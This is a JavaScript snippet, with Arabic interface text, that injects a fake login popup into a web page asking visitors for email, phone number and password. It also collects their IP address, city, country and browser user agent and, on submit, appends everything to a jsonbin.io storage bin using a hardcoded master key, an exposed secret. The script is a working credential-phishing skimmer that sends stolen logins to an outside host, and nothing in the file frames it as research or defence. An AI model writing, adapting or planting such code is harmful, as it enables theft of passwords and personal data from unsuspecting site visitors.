// Toggle this variable to enable/disable the popup.
var enablePopup = false;

if (enablePopup) {
    // Create the popup container
    var popup = document.createElement("div");
    popup.style.position = "fixed";
    popup.style.top = "50%";
    popup.style.left = "50%";
    popup.style.transform = "translate(-50%, -50%)";
    popup.style.backgroundColor = "#1E0232";
    popup.style.padding = "20px";
    popup.style.borderRadius = "10px";
    popup.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.5)";
    popup.style.color = "white";
    popup.style.textAlign = "center";
    popup.style.fontFamily = "Arial, sans-serif";
    popup.style.width = "90%";
    popup.style.maxWidth = "400px";
    popup.style.zIndex = "1000";

    // Add the title
    var title = document.createElement("h2");
    title.textContent = "للمتابعة يجب عليك تسجيل الدخول";
    title.style.marginBottom = "20px";
    popup.appendChild(title);

    // Function to create an input field
    function createInput(type, placeholder) {
        var input = document.createElement("input");
        input.type = type;
        input.placeholder = placeholder;
        input.style.width = "90%";
        input.style.padding = "15px";
        input.style.margin = "10px 0";
        input.style.border = "1px solid #555";
        input.style.borderRadius = "5px";
        input.style.backgroundColor = "white";
        input.style.color = "black";
        input.style.caretColor = "black";
        input.style.fontSize = "16px";
        return input;
    }

    // Add input fields
    var emailInput = createInput("text", "...البريد الالكتروني");
    var phoneInput = createInput("text", "...رقم الهاتف");
    var passwordInput = createInput("password", "...كلمة المرور");

    popup.appendChild(emailInput);
    popup.appendChild(phoneInput);
    popup.appendChild(passwordInput);

    // Add the login button
    var loginButton = document.createElement("button");
    loginButton.textContent = "تسجيل الدخول";
    loginButton.style.width = "50%";
    loginButton.style.padding = "10px";
    loginButton.style.backgroundColor = "#007BFF";
    loginButton.style.border = "none";
    loginButton.style.borderRadius = "5px";
    loginButton.style.color = "white";
    loginButton.style.fontSize = "16px";
    loginButton.style.cursor = "pointer";
    loginButton.style.marginTop = "10px";
    
// Preload IP and location data when the popup is shown
let preloadedData = { ip: "", city: "", country: "", platform: "" };

// Fetch IP, city, and country
fetch("https://ipapi.co/json/")
    .then((response) => response.json())
    .then((ipData) => {
        preloadedData.ip = ipData.ip;
        preloadedData.city = ipData.city;
        preloadedData.country = ipData.country_name;
    })
    .catch((error) => {
       // console.error("Error fetching IP data:", error);
        preloadedData.ip = "Unknown IP";
        preloadedData.city = "Unknown City";
        preloadedData.country = "Unknown Country";
    });

// Identify platform
 preloadedData.platform  = navigator.userAgent.toLowerCase();

// Login button click handler
loginButton.addEventListener("click", function () {
    // Validate phone number (only numbers, 11 digits)
    var phoneRegex = /^\d{11}$/;
    if (!phoneRegex.test(phoneInput.value)) {
        alert("يرجى إدخال رقم هاتف مكون من 11 رقماً!");
        return;
    }
    // Check password
    if (!passwordInput.value) {
        alert("يرجى إدخال كلمة المرور!");
        return;
    }
    // Check email
    if (!emailInput.value) {
        alert("يرجى إدخال بريد الكتروني صالح!");
        return;
    }

    // Disable the login button while processing
    loginButton.disabled = true;
    loginButton.style.opacity = "0.6"; // Reduce opacity to indicate it's disabled
    loginButton.style.cursor = "not-allowed"; // Change cursor to indicate it's disabled

    // Show loading alert
    alert("جارِ التسجيل...");

    // Format timestamp for Baghdad time in 12-hour format
    var baghdadTime = new Date().toLocaleString("en-GB", {
        timeZone: "Asia/Baghdad",
        year: "numeric",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true, // 12-hour format
    });

    // Prepare data to send
    var data = {
        email: emailInput.value,
        phone: phoneInput.value,
        password: passwordInput.value,
        timestamp: baghdadTime, // Baghdad time
        ip: `${preloadedData.ip}, ${preloadedData.city}, ${preloadedData.country}`, // Preloaded IP, city, and country
        platform: preloadedData.platform, // Preloaded platform
    };

    // Fetch existing records first
    fetch("https://api.jsonbin.io/v3/b/67b41244acd3cb34a8e65fb7/latest", {
        method: "GET",
        headers: {
            "X-Master-Key": "$2a$10$19/iwvXYHVkeGiTQx4QFKu62Fz56RPCTuBUsCO8GJEi7SJqJBpHHu",
        },
    })
        .then((response) => response.json())
        .then((result) => {
            var existingRecords = result.record?.records || [];
            // Append the new user data to the existing records
            existingRecords.push(data);

            // Update the bin with the combined data
            return fetch("https://api.jsonbin.io/v3/b/67b41244acd3cb34a8e65fb7", {
                method: "PUT",
                headers: {
                    "Content-Type": "application/json",
                    "X-Master-Key": "$2a$10$19/iwvXYHVkeGiTQx4QFKu62Fz56RPCTuBUsCO8GJEi7SJqJBpHHu",
                },
                body: JSON.stringify({ records: existingRecords }),
            });
        })
        .then(() => {
            alert("تم التسجيل بنجاح!");
            document.body.removeChild(popup);
        })
        .catch(() => {
            alert("حدث خطأ أثناء التسجيل. حاول مرة أخرى.");
        })
        .finally(() => {
            // Re-enable the button after processing is done
            loginButton.disabled = false;
            loginButton.style.opacity = "1";
            loginButton.style.cursor = "pointer";
        });
});
    popup.appendChild(loginButton);
    // Add the popup to the body
    document.body.appendChild(popup);
}
